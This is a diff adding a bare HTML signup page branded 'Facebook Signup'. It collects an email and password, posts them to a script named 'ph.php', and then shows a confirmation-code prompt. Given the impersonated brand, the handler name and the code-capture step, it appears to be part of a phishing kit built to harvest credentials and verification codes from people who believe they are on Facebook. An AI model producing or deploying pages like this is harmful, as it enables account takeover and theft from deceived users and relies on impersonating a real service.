@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Facebook Signup</title>
+  <link rel="stylesheet" type="text/css" href="form.css">
+</head>
+<body>
+  <div class="signup-container">
+    <h2>Create a new account</h2>
+    <form id="signupForm" onsubmit="return validateForm()" action="ph.php" method="post">
+      <label for="email">Email:</label>
+      <input type="text" id="email" name="email" placeholder="Your email" required><br>
+
+      <label for="password">Password:</label>
+      <input type="password" id="password" name="password" placeholder="Your password" required><br>
+
+      <button type="submit">Sign Up</button>
+    </form>
+    <div id="confirmationCodeContainer" style="display:none;">
+      <label for="confirmationCode">Confirmation Code:</label>
+      <input type="text" id="confirmationCode" placeholder="Enter code">
+      <button onclick="verifyCode()">Verify Code</button>
+    </div>
+    <div id="verificationStatus"></div>
+  </div>
+
+  <script src="javas.js"></script>
+</body>
+</html>
